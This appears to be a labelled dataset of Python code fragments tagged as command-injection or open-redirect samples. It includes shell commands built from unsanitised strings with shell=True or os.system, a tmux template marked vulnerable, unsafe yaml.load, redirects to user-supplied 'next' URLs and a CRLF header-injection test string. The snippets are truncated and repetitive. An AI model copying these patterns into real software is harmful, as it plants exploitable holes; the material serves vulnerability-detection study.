"        fields = ('select', 'id_', 'dut_serial_port', 'timestamp',class result_table(results_table):        '<input type=""submit"" name=""delete"" value=""Delete"" onclick=""return '        'confirm(""Are you sure you want to delete this result?"")"" />')        '<input type=""submit"" name=""save"" value=""Save"" onclick=""return confirm('        '""Are you sure you want to edit this result?"")""/>')        '<input name=""outcome"" type=""text"" value=""{{ value }}"" />')        '<input name=""outcome_category"" type=""text"" value=""{{ value }}"" />')        exclude = ('id_', 'select', 'targets')                  'outcome', 'num_injections', 'data_diff', 'detected_errors')        '{% if value %}<code class=""console"">{{ value }}</code>{% endif %}')        fields = ('timestamp', 'level', 'source', 'event_type', 'description',                  'success')",vulns_injection
"    time.sleep(0.5)    thirdPage, thirdHeaders = Request.queryPage(content=True)    condition  = firstPage == secondPage    condition &= secondPage == thirdPage",vulns_injection
"                                  ""you can run your own SQL SELECT queries."")",vulns_injection
"                               help=""SQL SELECT query to be executed"")",vulns_injection
"        return round(conf.seqMatcher.ratio(), 5)    elif round(conf.seqMatcher.ratio(), 5) >= MATCH_RATIO:",vulns_injection
"        newResult = Request.queryPage(payload)        if count:            for element in resultDict.values():                if element[0] == 1:                        value = ""%s?%s"" % (conf.url, payload)                        value += ""\nPOST:\t'%s'\n"" % payload                        value += ""\nCookie:\t'%s'\n"" % payload                        value += ""\nUser-Agent:\t'%s'\n"" % payload",vulns_injection
"    time.sleep(0.5)    thirdPage, thirdHeaders = Request.queryPage(content=True)    condition  = firstPage == secondPage    condition &= secondPage == thirdPage",vulns_injection
"                                  ""you can run your own SQL SELECT queries."")",vulns_injection
"                               help=""SQL SELECT query to be executed"")",vulns_injection
"        return round(conf.seqMatcher.ratio(), 5)    elif round(conf.seqMatcher.ratio(), 5) >= MATCH_RATIO:",vulns_injection
"        newResult = Request.queryPage(payload)        if count:            for element in resultDict.values():                if element[0] == 1:                        value = ""%s?%s"" % (conf.url, payload)                        value += ""\nPOST:\t'%s'\n"" % payload                        value += ""\nCookie:\t'%s'\n"" % payload                        value += ""\nUser-Agent:\t'%s'\n"" % payload",vulns_injection
"    time.sleep(0.5)    thirdPage, thirdHeaders = Request.queryPage(content=True)    condition  = firstPage == secondPage    condition &= secondPage == thirdPage",vulns_injection
"                                  ""you can run your own SQL SELECT queries."")",vulns_injection
"                               help=""SQL SELECT query to be executed"")",vulns_injection
"        return round(conf.seqMatcher.ratio(), 5)    elif round(conf.seqMatcher.ratio(), 5) >= MATCH_RATIO:",vulns_injection
"        newResult = Request.queryPage(payload)        if count:            for element in resultDict.values():                if element[0] == 1:                        value = ""%s?%s"" % (conf.url, payload)                        value += ""\nPOST:\t'%s'\n"" % payload                        value += ""\nCookie:\t'%s'\n"" % payload                        value += ""\nUser-Agent:\t'%s'\n"" % payload",vulns_injection
"    time.sleep(0.5)    thirdPage, thirdHeaders = Request.queryPage(content=True)    condition  = firstPage == secondPage    condition &= secondPage == thirdPage",vulns_injection
"                                  ""you can run your own SQL SELECT queries."")",vulns_injection
"                               help=""SQL SELECT query to be executed"")",vulns_injection
"        return round(conf.seqMatcher.ratio(), 5)    elif round(conf.seqMatcher.ratio(), 5) >= MATCH_RATIO:",vulns_injection
"        newResult = Request.queryPage(payload)        if count:            for element in resultDict.values():                if element[0] == 1:                        value = ""%s?%s"" % (conf.url, payload)                        value += ""\nPOST:\t'%s'\n"" % payload                        value += ""\nCookie:\t'%s'\n"" % payload                        value += ""\nUser-Agent:\t'%s'\n"" % payload",vulns_injection
"    time.sleep(0.5)    thirdPage, thirdHeaders = Request.queryPage(content=True)    condition  = firstPage == secondPage    condition &= secondPage == thirdPage",vulns_injection
"                                  ""you can run your own SQL SELECT queries."")",vulns_injection
"                               help=""SQL SELECT query to be executed"")",vulns_injection
"        return round(conf.seqMatcher.ratio(), 5)    elif round(conf.seqMatcher.ratio(), 5) >= MATCH_RATIO:",vulns_injection
"        newResult = Request.queryPage(payload)        if count:            for element in resultDict.values():                if element[0] == 1:                        value = ""%s?%s"" % (conf.url, payload)                        value += ""\nPOST:\t'%s'\n"" % payload                        value += ""\nCookie:\t'%s'\n"" % payload                        value += ""\nUser-Agent:\t'%s'\n"" % payload",vulns_injection
        return Config.editUserConfig(arg['<editor>']),vulns_injection
"file = sys.stderrverbose = Falsequiet = Falsedef debug(*arg):        print('DBG:', *arg, file=file)def warn(*arg):    if not quiet:        print('WARN:', *arg, file=file)def err(*arg):    print('ERR:', *arg, file=file)",vulns_injection
"        'docclass': 'beamer', # Obvs        'theme': 'Copenhagen',        'scheme': 'beaver',        'safe': True,        'pdflatex': 'pdflatex',        'vbtmCmds': {",vulns_injection
"        'emph': {                '*': r'\textbf{%s}',                '_': r'\textit{%s}',                '~': r'\sout{%s}',                '**': r'\alert{%s}',                '__': r'\underline{%s}',            },        'stretch': {                '<>': lambda s: '\\centering\\noindent\\resizebox{0.9\\textwidth}{!}{%s}' % s,                '><': lambda s: '\\begin{center}\n%s\n\\end{center}' % s,                '<<': lambda s: '\\begin{flushleft}\n%s\n\\end{flushleft}' % s,                '>>': lambda s: '\\begin{flushright}\n%s\n\\end{flushright}' % s,                '+' : lambda s: r'\pause ',  # @UnusedVariable                '>' : lambda s: r'\hfill ',  # @UnusedVariable                '^^': lambda s: r'\vspace{-%s}' % s, # TODO check number, add default unit (mm)                'vv': lambda s: r'\vspace{%s}' % s, # TODO check number, add default unit (mm)                '__': lambda s: r'{\footnotesize %s}' % s,                ':' : lambda s: r''        'bib': None,",vulns_injection
                        cf.read(),vulns_injection
"            cls.recursiveUpdate(cls.effectiveConfig, c)        try:            cls.recursiveUpdate(cls.cmdlineConfig, yaml.load(general))        except:            pass",vulns_injection
"    def editUserConfig(cls, editor):",vulns_injection
"            except:                pass    def recursiveUpdate(target, content):        for k in content:            if k in target and isinstance(content[k], dict) and isinstance(target[k], dict):                Config.recursiveUpdate(target[k], content[k])            elif k in target and isinstance(content[k], list) and isinstance(target[k], list):                target[k] += content[k]                target[k] = content[k]",vulns_injection
"from beamr.interpreters import Config, VerbatimEnv",vulns_injection
"    docClassCmd = (r'\documentclass[%s]{%s}', r'\documentclass{%s}')    packageCmd = (r'\usepackage[%s]{%s}', r'\usepackage{%s}')    titlePageCmd = '\\frame{\\titlepage}\n'    begin = '\n\\begin{document}\n'    end = '\\end{document}\n'    preambleCmds = {'theme'    : '\\usetheme{%s}\n',                    'scheme'   : '\\usecolortheme{%s}\n',                    'title'    : '\\title{%s}\n',                    'author'   : '\\author{%s}\n',                    'institute': '\\institute{%s}\n',                    'date'     : '\\date{%s}\n'}        if txt.find('\t') > -1:            warn(""Input file has tabs, which will be considered 4 spaces; but please don't use tabs!"")        super(Document, self).__init__(docParser.parse(txt, docLexer), after=self.end)",vulns_injection
"        packageDef = self.splitCmd(self.docClassCmd, Config.getRaw('docclass'))            packageDef += self.splitCmd(self.packageCmd, pkg)        outerPreamble = ''        for k in self.preambleCmds:            if k in Config.effectiveConfig:                outerPreamble += self.preambleCmds[k] % Config.getRaw(k)        innerPreamble = VerbatimEnv.preambleDefs        if Config.effectiveConfig.get('titlepage', 'no') in ['yes', 'y', 'true', True]:            innerPreamble += self.titlePageCmd        self.before = packageDef + outerPreamble + self.begin + innerPreamble",vulns_injection
"    before = '\\begin{frame}%s{%s}\n'    after = '\n\\end{frame}\n'    def __init__(self, txt):        headBegin = txt.find('[')        headEnd = txt.find('\n', headBegin)        headSplit = (txt.find(' ', headBegin) + 1) or headEnd # If there is a blank, title begins after it; otherwise stop at end of line and title will be the empty string.        opts = txt[headBegin+1 : headSplit].strip()                    opts = '[allowframebreaks]'                        opts = '[shrink=%s]' % opts[1:]                        warn('Slide title: Invalid shrink specifier:', opts[1:])                        opts = ''                warn('Slide title: Invalid slide option:', opts)                opts = ''        super(Slide, self).__init__(slideParser.parse(txt[headEnd:-1], slideLexer),                         self.before % (opts, txt[headSplit:headEnd]),                         self.after)",vulns_injection
"    begin = '\\begin{columns}\n'    end = '\\end{columns}'    marker = '\\column{%.3f\\textwidth}\n'        debug('Txt picked up by col:', txt)        txt = txt[i+1:]",vulns_injection
                currentColumnSet[0].before = cls.begin                currentColumnSet[-1].after += cls.end,vulns_injection
                    col.before += cls.marker % (col.percentage if col.percentage > 0.0,vulns_injection
"class Box(Hierarchy):    begin = '\\begin{%sblock}{%s}\n'    end = '\\end{%sblock}\n'    def __init__(self, txt):        txt = txt.strip()[:-1]        i = txt.find('\n') # Guaranteed >0 by regex definition        head = txt[:i].strip()        txt = txt[i+1:]        kind = ''        if head[1] == '!':            kind = 'alert'        head = head[2:]            super(Box, self).__init__(slideParser.parse(txt, slideLexer),                                      self.begin % (kind, head),                                      self.end % kind)",vulns_injection
"    def __init__(self, flag, txt=''):        self.flag = flag        return Config.get('stretch', self.flag)(super(Stretch, self).__str__())            super(Footnote, self).__init__(slideParser.parse(txt, slideLexer),                                            r'\footnote[frame]{', '}')",vulns_injection
from beamr.lexers import imageLexer,vulns_injection
"        debug('Comment ', txt)        super(Comment, self).__init__('% ' + txt)        if Config.effectiveConfig['bib']:            return r'\cite{' + self.txt + '}'            warn('Citations used but no bibliography file given.')    def __init__(self, txt):        super(Url, self).__init__(r'\url{' + txt + '}')    formats = [        '\\section{ %s }\n',        '\\subsection{ %s }\n',        '\\subsubsection{ %s }\n'        ]        txt = txt.strip().splitlines()",vulns_injection
"            warn(""Something's wrong with heading marker"", marker, 'having index', i)        super(Heading, self).__init__(Heading.formats[i] % txt[0])        debug('Heading level', i, marker, txt[0])",vulns_injection
"            warn('Image Frame: PIL support not yet implemented, falling back to basic grid. Some images may be distorted.')",vulns_injection
"        warn('Plus integration not yet implemented')        warn('Tables not yet implemented')        super(TableEnv, self).__init__( 'Table: ' + txt )class ScissorEnv(Text):    includeCmd = r'{\setbeamercolor{background canvas}{bg=}\includepdf%s{%%s}}'    pagesSpec = '[pages={%s}]'        super(ScissorEnv, self).__init__(self._init_helper(txt.strip().split()) + '\n')    def _init_helper(self, arr):        if len(arr) == 0:            warn('Skipping empty scissor command')            warn('File included in scissor command not found, proceeding unsafely...')                cmd = self.includeCmd % self.pagesSpec                return cmd % (arr[1], arr[0])                warn('Ignoring malformed page range in scissor command')            if len(arr) > 2:                warn('Ignoring extraneous arguments in scissor command')        cmd = self.includeCmd % ''        return cmd % arr[0]",vulns_injection
"        self.insertCmd = Config.get('vbtmCmds', 'insertion')(lettr)",vulns_injection
"            packageList = Config.getRaw('vbtmCmds', 'packageNames')            cls.preambleDefs = Config.getRaw('vbtmCmds', 'once', package) + '\n'                    cls.preambleDefs += Config.getRaw('vbtmCmds', 'foreach', package) % (                    cls.preambleDefs += Config.getRaw('vbtmCmds', 'foreachNoLang', package) % (",vulns_injection
"tokens = ('COMMENT', 'HEADING', 'SLIDE', 'SCISSOR', 'YAML', 'TEXT')    r'(^|\n).+\n[_~=-]{4,}\n'    r'(^\[|\n\[)[\s\S]+?\n\]'    t.value = beamr.interpreters.Slide(t.value)    r'(8<|>8){[\s\S]+?}'    r'(^|\n)---\n[\s\S]*?(\n\.\.\.|$)'t_TEXT = r'[\s\S]+?(?=(\n|\[|#|$|>|8))'",vulns_injection
"    warn ('Skip lexing error..', t)",vulns_injection
"from beamr.lexers.document import t_COMMENT  # Used internally by lex() @UnusedImport       'STRETCH1',       'STRETCH2',",vulns_injection
"def t_ESCAPE(t):    r'\\[^0-9A-Za-z\s]' # e.g. \# # Almost copy-paste from https://github.com/Khan/simple-markdown/blob/master/simple-markdown.js    t.value = beamr.interpreters.Escape(t.value)def t_STRETCH1(t):    r'\[[<>_^:+]\]' # e.g. [+] # TODO Tailor to those actually used    t.value = beamr.interpreters.Stretch(t.value[1])def t_STRETCH2(t):    r'\[[<>_v^].+?[<>_v^]\]' # e.g. [< Stretched text >]    t.value = beamr.interpreters.Stretch(t.value[1]+t.value[-2], t.value[2:-2])    r'(?P<EMPH_FLAG>[*_~]{1,2})(?P<EMPH_TXT>[\S](.*?[\S])?)(?P=EMPH_FLAG)' # e.g. *Bold text*, ~Strikethrough text~    global lexer    gd = lexer.lexmatch.groupdict()    r'\[--.+?\]' # e.g. [fn:See attached docs]    t.value = beamr.interpreters.Citation(t.value[3:-1])    r'\[-.+?-\]' # e.g. [fn:See attached docs]",vulns_injection
"    r'(^|\n)(?P<LI_INDENT> *)(\*|-)(|\.|,|=)(|\+) .*(\n((?P=LI_INDENT) .*| *))*(?=\n|$)'",vulns_injection
    r'(^|\n)(?P<COL_INDENT> *)\|(\d*\.?\d+(%|)|) *(\n((?P=COL_INDENT) .*| *))+(?=\n|$)'    r'(^|\n)(?P<PLUS_INDENT> *)\[[\s\S]+\n(?P=PLUS_INDENT)\]'    r'={[\s\S]+?}'    t.value = beamr.interpreters.TableEnv(t.value)    r'(^|\n)(?P<VBTM_INDENT> *){{(?P<VBTM_HEAD>.*)\n(?P<VBTM_BODY>[\s\S]+)\n(?P=VBTM_INDENT)}}'    global lexer    gd = lexer.lexmatch.groupdict()    r'(^|\n)(?P<BOX_INDENT> *)\((\*|!)[\s\S]+?\n(?P=BOX_INDENT)\)'    t.value = beamr.interpreters.Box(t.value)    r'[%&]'    t.value = beamr.interpreters.Text('\\' + t.value)    r'[\s\S]+?(?=[^0-9A-Za-z\s]|\n|$)' # Inspired loosely from https://github.com/Khan/simple-markdown/blob/master/simple-markdown.js,vulns_injection
"parser = yacc.yacc(tabmodule='document_parsetab', debugfile='document_parsedbg', debug=not debug.quiet)",vulns_injection
"parser = yacc.yacc(tabmodule='image_parsetab', debugfile='image_parsedbg', debug=not debug.quiet)",vulns_injection
            | STRETCH1            | STRETCH2,vulns_injection
"parser = yacc.yacc(tabmodule='slide_parsetab', debugfile='slide_parsedbg', debug=not debug.quiet)",vulns_injection
        parsed = vars(self.parse_known_args(nohelp=True)[0]),vulns_injection
        parsed = vars(self.parse_known_args(nohelp=True)[0]),vulns_injection
        parsed = vars(self.parse_known_args(nohelp=True)[0]),vulns_injection
"    def run(self):        result = subprocess.run(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)",vulns_injection
"    def run(self, command_id):        return command.run()",vulns_injection
def run_command(id):    return commands.run(id),vulns_injection
"        self.assertRaises(sievelib.commands.UnknownCommand, sievelib.commands.get_command_instance, 'unknowncommand')",vulns_injection
"class Host(Base.MessageHandler):    def __call__(self, msg, arguments, errorSink=None):            [""host"", arguments],        self.reply(msg, output)",vulns_injection
"            pingcmd + self.pingargs + [args.host],",vulns_injection
"class SoftwareAdmin(admin.ModelAdmin):    class Media:        js = (            'checkcve/js/mask-command-field.js',        )admin.site.register(Software, SoftwareAdmin)",vulns_injection
"							response.add_action(self.send_message(line))",vulns_injection
        cmd = cmd + ' -' + args,vulns_injection
        cmd = cmd + ' -' + args,vulns_injection
        cmd = cmd + ' -' + args,vulns_injection
"			return  urlObj.read(4096).strip().replace(""\n"","""")",vulns_injection
"			return  urlObj.read(4096).strip().replace(""\n"","""")",vulns_injection
"        bargs= [self.get_path_to_ansible_inventory(), '-i', self.source]",vulns_injection
"        'project_id': project    handle, path = tempfile.mkstemp(dir=private_data_dir)    f = os.fdopen(handle, 'w')    json.dump(json_cred, f)    f.close()",vulns_injection
"        env['AZURE_SUBSCRIPTION_ID'] = cred.get_input('subscription', default='')        env['AZURE_SUBSCRIPTION_ID'] = cred.get_input('subscription', default='')",vulns_injection
        else:            return bool(self.source in CLOUD_INVENTORY_SOURCES),vulns_injection
"        if (self.source not in ('custom', 'ec2', 'scm') and                not (self.get_cloud_credential())):            return False        elif self.source == 'scm' and not self.inventory_source.source_project:            return False        elif self.source == 'file':",vulns_injection
"    Inventory, SmartInventoryMembership,",vulns_injection
        This is the mechanism by which any data that needs to be passed,vulns_injection
"        if inventory_update.source == 'gce':            env['GCE_ZONE'] = inventory_update.source_regions if inventory_update.source_regions != 'all' else ''  # noqa            cp = configparser.ConfigParser()            cp.add_section('cache')            cp.set('cache', 'cache_max_age', '0')            handle, path = tempfile.mkstemp(dir=private_data_dir)            cp.write(os.fdopen(handle, 'w'))            os.chmod(path, stat.S_IRUSR | stat.S_IWUSR)            env['GCE_INI_PATH'] = path        elif inventory_update.source in ['scm', 'custom']:        elif inventory_update.source == 'tower':            env['TOWER_INVENTORY'] = inventory_update.instance_filters            env['TOWER_LICENSE_TYPE'] = get_licenser().validate()['license_type']",vulns_injection
"            plugin_path = self.get_path_to('..', 'plugins', 'inventory',                                           '%s.py' % src)            args.append(plugin_path)            args.append(inventory_update.get_actual_source_path())            handle, path = tempfile.mkstemp(dir=private_data_dir)            os.chmod(path, stat.S_IRUSR | stat.S_IWUSR | stat.S_IXUSR)            args.append(path)            args.append(""--custom"")        args.append('-v%d' % inventory_update.verbosity)        if settings.DEBUG:            args.append('--traceback')        return args        if inventory_update.source == 'scm' and inventory_update.source_project_update:        return self.get_path_to('..', 'plugins', 'inventory')",vulns_injection
"        bargs= [self.get_path_to_ansible_inventory(), '-i', self.source]",vulns_injection
"        'project_id': project    handle, path = tempfile.mkstemp(dir=private_data_dir)    f = os.fdopen(handle, 'w')    json.dump(json_cred, f)    f.close()",vulns_injection
"        env['AZURE_SUBSCRIPTION_ID'] = cred.get_input('subscription', default='')        env['AZURE_SUBSCRIPTION_ID'] = cred.get_input('subscription', default='')",vulns_injection
        else:            return bool(self.source in CLOUD_INVENTORY_SOURCES),vulns_injection
"        if (self.source not in ('custom', 'ec2', 'scm') and                not (self.get_cloud_credential())):            return False        elif self.source == 'scm' and not self.inventory_source.source_project:            return False        elif self.source == 'file':",vulns_injection
"    Inventory, SmartInventoryMembership,",vulns_injection
        This is the mechanism by which any data that needs to be passed,vulns_injection
"        if inventory_update.source == 'gce':            env['GCE_ZONE'] = inventory_update.source_regions if inventory_update.source_regions != 'all' else ''  # noqa            cp = configparser.ConfigParser()            cp.add_section('cache')            cp.set('cache', 'cache_max_age', '0')            handle, path = tempfile.mkstemp(dir=private_data_dir)            cp.write(os.fdopen(handle, 'w'))            os.chmod(path, stat.S_IRUSR | stat.S_IWUSR)            env['GCE_INI_PATH'] = path        elif inventory_update.source in ['scm', 'custom']:        elif inventory_update.source == 'tower':            env['TOWER_INVENTORY'] = inventory_update.instance_filters            env['TOWER_LICENSE_TYPE'] = get_licenser().validate()['license_type']",vulns_injection
"            plugin_path = self.get_path_to('..', 'plugins', 'inventory',                                           '%s.py' % src)            args.append(plugin_path)            args.append(inventory_update.get_actual_source_path())            handle, path = tempfile.mkstemp(dir=private_data_dir)            os.chmod(path, stat.S_IRUSR | stat.S_IWUSR | stat.S_IXUSR)            args.append(path)            args.append(""--custom"")        args.append('-v%d' % inventory_update.verbosity)        if settings.DEBUG:            args.append('--traceback')        return args        if inventory_update.source == 'scm' and inventory_update.source_project_update:        return self.get_path_to('..', 'plugins', 'inventory')",vulns_injection
from m5.objects.Device import PioDevice,vulns_injection
"                maint_int=ArmPPI(num=25))                self.gic,",vulns_injection
from m5.objects.Device import PioDevice,vulns_injection
"                maint_int=ArmPPI(num=25))                self.gic,",vulns_injection
from m5.objects.Device import PioDevice,vulns_injection
"                maint_int=ArmPPI(num=25))                self.gic,",vulns_injection
"WHITELIST_COMMAND_TEMPLATE = 'tmux send-keys -t ""0:0"" Enter ""whitelist add {}"" Enter'  # Vulnerable to command injection",vulns_injection
def whitelist(users: str):        call(WHITELIST_COMMAND_TEMPLATE.format(user)),vulns_injection
"                os.system('notify-send ""Cant find |%s| on dictionary.com!""' % word)                os.system('notify-send ""Cant find |%s| on dictionary.com!""' % word)",vulns_injection
"                    os.system('notify-send ""definitions from dictionary.com:[{}\n{}""'\                    .format(word+""]\n------------"",'\n'.join(definitions)))                os.system('notify-send ""Cant find |%s| on urbandictionary.com!""' % word)                os.system('notify-send ""Cant find |%s| on urbandictionary.com!""' % word)",vulns_injection
"                os.system('notify-send ""definitions from urbandictionary.com:[{}\n{}""'\                .format(word+""]\n------------"",'\n'.join(definitionsURB)))",vulns_injection
"    if syscall_name not in syscalls.keys():        raise ValueError(""The syscall name you provided is not available!"")",vulns_injection
"    __slots__ = ('idleTimeout', 'timeout', 'insecure')    def __init__ (self, idleTimeout=2, timeout=10, insecure=False):    def toDict (self):        return dict (                idleTimeout=self.idleTimeout,                timeout=self.timeout,                insecure=self.insecure,                )",vulns_injection
"    discord_service = services.discord_service()    discord_service.run(discord_token)",vulns_injection
        return [x for x in all_roles if x.name == role_name][0],vulns_injection
        command = '{} rclone lsjson current:'.format(credentials)            result = self._execute(command),vulns_injection
"        command = (            '{credentials} '            'rclone lsjson current:{path}'        ).format(            credentials=credentials,            path=path,        )            result = self._execute(command)",vulns_injection
"        command = (            '{credentials} '            'rclone touch current:{path}/.keep'        ).format(            credentials=credentials,            path=path,        )            result = self._execute(command)",vulns_injection
"        credentials = ''            credentials += self._formatCredentials(src_data, name='src')            credentials += self._formatCredentials(dst_data, name='dst')        command = (            '{credentials} '            'rclone copy {src} {dst} '            '--progress '            '--stats 2s '        ).format(            credentials=credentials,            src=src,            dst=dst,        logging.info(sanitize(command))",vulns_injection
"            self._execute_interactive(command, job_id)",vulns_injection
"        credentials = ''        credentials += ""{}_TYPE='{}' "".format(prefix, data.type)                credentials += ""{}='{}' "".format(env_key, value)",vulns_injection
"    def _execute(self, command):        byteOutput = subprocess.check_output(command, shell=True)    def _execute_interactive(self, command, job_id):    def __execute_interactive(self, command, job_id):            shell=True,",vulns_injection
from pants.util.contextutil import temporary_dirfrom pants.util.memo import memoized_property,vulns_injection
"  def __init__(self, binary_util, relpath, version, package_manager, yarnpkg_version):    self._relpath = relpath",vulns_injection
"  def get_binary_path_from_tgz(self, supportdir, version, filename, inpackage_path):    unpacked_dir = os.path.join(work_dir, 'unpacked')    if not os.path.exists(unpacked_dir):      with temporary_dir(root_dir=work_dir) as tmp_dist:        TGZ.extract(tarball_filepath, tmp_dist)        os.rename(tmp_dist, unpacked_dir)    binary_path = os.path.join(unpacked_dir, inpackage_path)    return binary_path  @memoized_property  def path(self):    """"""Returns the root path of this node distribution.    :returns: The Node distribution root path.    :rtype: string    """"""    node_path = self.get_binary_path_from_tgz(      supportdir=self._relpath, version=self.version, filename='node.tar.gz',      inpackage_path='node')    logger.debug('Node path: %s', node_path)    return node_path  @memoized_property  def yarnpkg_path(self):    """"""Returns the root path of yarnpkg distribution.    :returns: The yarnpkg root path.    yarnpkg_path = self.get_binary_path_from_tgz(      supportdir='bin/yarnpkg', version=self.yarnpkg_version, filename='yarnpkg.tar.gz',      inpackage_path='dist')    logger.debug('Yarnpkg path: %s', yarnpkg_path)    return yarnpkg_path  class Command(namedtuple('Command', ['bin_dir_path', 'executable', 'args'])):",vulns_injection
"      return [os.path.join(self.bin_dir_path, self.executable)] + self.args",vulns_injection
"      env['PATH'] = (self.bin_dir_path + os.path.pathsep + env['PATH']                     if env.get('PATH', '') else self.bin_dir_path)",vulns_injection
"    return self._create_command('node', args)",vulns_injection
"    return self._create_command('npm', args)",vulns_injection
"      bin_dir_path=os.path.join(self.yarnpkg_path, 'bin'), executable='yarnpkg', args=args or [])  def _create_command(self, executable, args=None):    return self.Command(os.path.join(self.path, 'bin'), executable, args or [])",vulns_injection
"                          choices=('a9', 'p2020'), dest='architecture',",vulns_injection
"                    choices=('all', 'results', 'campaign'),                    help='delete {results} for the selected campaign, '                         'delete selected {campaign} and its results, '                         'or delete {all} campaigns and results')",vulns_injection
                        db.log_event_exception(                            'SSH error')                    self.serial.port+' '+str(self.result_data['id'])+': ',vulns_injection
                            db.log_event_exception(                                'SCP error')                        self.serial.port+' '+str(self.result_data['id'])+': ',vulns_injection
                        db.log_event_exception(                            'SSH error')                    self.serial.port+' '+str(self.result_data['id'])+': ',vulns_injection
                except:                            db.log_event_exception(                                'SCP error')                        self.serial.port+' '+str(self.result_data['id'])+': ',vulns_injection
"                        event_buff = buff.replace(event_buff_logged, '')                        db.log_event(self.result_data['id'],                                     ('DUT' if not self.aux else 'AUX'),                                     'Read timeout', event_buff)                        event_buff_logged += event_buff",vulns_injection
        out = ''        try:            out += self.debugger.dut.serial.port+' '        except AttributeError:            pass        out += (str(self.result_data['id'])+': ' +                self.result_data['outcome_category']+' - ' +                self.result_data['outcome']),vulns_injection
                            db.log_event_exception(                                'Error resetting DUT')                            self.debugger.dut.serial.port+' ' +,vulns_injection
"        fields = ('source', 'event_type', 'description')",vulns_injection
"                  'data_diff', 'detected_errors', 'num_injections', 'targets',                  'registers')",vulns_injection
        parsed = vars(self.parse_known_args(nohelp=True)[0]),vulns_injection
def get_output(command: str) -> bytes:    return subprocess.check_output(command.split())def get_lines(command: str) -> List[str]:,vulns_injection
    return [line.strip().decode() for line in stdout.splitlines()],vulns_injection
"    diff_cmd = ""git diff-index --cached --name-only --diff-filter=ACMRTUXB HEAD""            staged_cmd = ""git show :%s"" % filename                file_contents=staged_contents.decode(),",vulns_injection
"                        file_contents=staged_contents.decode(),",vulns_injection
from subprocess import check_output,vulns_injection
"        check_output(['isort', '--check-only'])    results = check_output(['isort', '--check-only', '--settings-path=conf/.isort.cfg'])    assert b'skipped 2' in results.lower()",vulns_injection
"    results = check_output(['isort', 'dont_skip.py', 'migrations/file_glob_skip.py'])    assert b'skipped' not in results.lower()    results = check_output(['isort', '--filter-files', '--settings-path=conf/.isort.cfg', 'dont_skip.py', 'migrations/file_glob_skip.py'])    assert b'skipped 1' in results.lower()",vulns_injection
"    HttpResponseRedirect,",vulns_redirect
"    path = posixpath.normpath(path)    path = path.lstrip('/')    newpath = ''    for part in path.split('/'):        if not part:            continue        drive, part = os.path.splitdrive(part)        head, part = os.path.split(part)        if part in (os.curdir, os.pardir):            continue        newpath = os.path.join(newpath, part).replace('\\', '/')    if newpath and path != newpath:        return HttpResponseRedirect(newpath)    fullpath = os.path.join(document_root, newpath)            return directory_index(newpath, fullpath)",vulns_redirect
"    HttpResponseRedirect,",vulns_redirect
"    path = posixpath.normpath(path)    path = path.lstrip('/')    newpath = ''    for part in path.split('/'):        if not part:            continue        drive, part = os.path.splitdrive(part)        head, part = os.path.split(part)        if part in (os.curdir, os.pardir):            continue        newpath = os.path.join(newpath, part).replace('\\', '/')    if newpath and path != newpath:        return HttpResponseRedirect(newpath)    fullpath = os.path.join(document_root, newpath)            return directory_index(newpath, fullpath)",vulns_redirect
"    HttpResponseRedirect,",vulns_redirect
"    path = posixpath.normpath(path)    path = path.lstrip('/')    newpath = ''    for part in path.split('/'):        if not part:            continue        drive, part = os.path.splitdrive(part)        head, part = os.path.split(part)        if part in (os.curdir, os.pardir):            continue        newpath = os.path.join(newpath, part).replace('\\', '/')    if newpath and path != newpath:        return HttpResponseRedirect(newpath)    fullpath = os.path.join(document_root, newpath)            return directory_index(newpath, fullpath)",vulns_redirect
"    HttpResponseRedirect,",vulns_redirect
"    path = posixpath.normpath(path)    path = path.lstrip('/')    newpath = ''    for part in path.split('/'):        if not part:            continue        drive, part = os.path.splitdrive(part)        head, part = os.path.split(part)        if part in (os.curdir, os.pardir):            continue        newpath = os.path.join(newpath, part).replace('\\', '/')    if newpath and path != newpath:        return HttpResponseRedirect(newpath)    fullpath = os.path.join(document_root, newpath)            return directory_index(newpath, fullpath)",vulns_redirect
"    HttpResponseRedirect,",vulns_redirect
"    path = posixpath.normpath(path)    path = path.lstrip('/')    newpath = ''    for part in path.split('/'):        if not part:            continue        drive, part = os.path.splitdrive(part)        head, part = os.path.split(part)        if part in (os.curdir, os.pardir):            continue        newpath = os.path.join(newpath, part).replace('\\', '/')    if newpath and path != newpath:        return HttpResponseRedirect(newpath)    fullpath = os.path.join(document_root, newpath)            return directory_index(newpath, fullpath)",vulns_redirect
"    HttpResponseRedirect,",vulns_redirect
"    path = posixpath.normpath(path)    path = path.lstrip('/')    newpath = ''    for part in path.split('/'):        if not part:            continue        drive, part = os.path.splitdrive(part)        head, part = os.path.split(part)        if part in (os.curdir, os.pardir):            continue        newpath = os.path.join(newpath, part).replace('\\', '/')    if newpath and path != newpath:        return HttpResponseRedirect(newpath)    fullpath = os.path.join(document_root, newpath)            return directory_index(newpath, fullpath)",vulns_redirect
        request.session['oidc_login_next'] = request.GET.get(redirect_field_name),vulns_redirect
        request.session['oidc_login_next'] = request.GET.get(redirect_field_name),vulns_redirect
        request.session['oidc_login_next'] = request.GET.get(redirect_field_name),vulns_redirect
        self.assertTrue('login/foo%0D%0ALocation' in response['location']),vulns_redirect
        self.assertTrue('login/foo%0D%0ALocation' in response['location']),vulns_redirect
        self.assertTrue('login/foo%0D%0ALocation' in response['location']),vulns_redirect
        self.assertTrue('login/foo%0D%0ALocation' in response['location']),vulns_redirect
        self.assertTrue('login/foo%0D%0ALocation' in response['location']),vulns_redirect
        self.assertTrue('login/foo%0D%0ALocation' in response['location']),vulns_redirect
        self.assertTrue('login/foo%0D%0ALocation' in response['location']),vulns_redirect
"from itsdangerous import TimedJSONWebSignatureSerializer, SignatureExpired",vulns_redirect
        response = redirect(destination),vulns_redirect
            return redirect(request.args.get('next') or url_for('main.index')),vulns_redirect
        return  current_user.is_authenticated and current_user.role.role_code in self.roles_allowed        'group_exam_ind',vulns_redirect
"        'group_exam_ind'    form_edit_rules = (        'exam_type_name',        'exam_color',        'number_of_hours',        'method_type',        'ita_ind',        'group_exam_ind'    )",vulns_redirect
        'group_exam_ind',vulns_redirect
"    column_list = ['office_name', 'sb', 'services', 'deleted', 'exams_enabled_ind', 'timezone.timezone_name']    form_excluded_columns = ('citizens', 'csrs', 'exams', 'rooms', 'invigilators')",vulns_redirect
"from sqlalchemy import exc, or_",vulns_redirect
                                              Exam.exam_returned_date > ninety_day_filter))                                              Exam.exam_returned_date > ninety_day_filter)),vulns_redirect
            exams_enabled_ind=1            exams_enabled_ind=0            exams_enabled_ind=0,vulns_redirect
            csr_state_id=csr_state_logout.csr_state_id,vulns_redirect
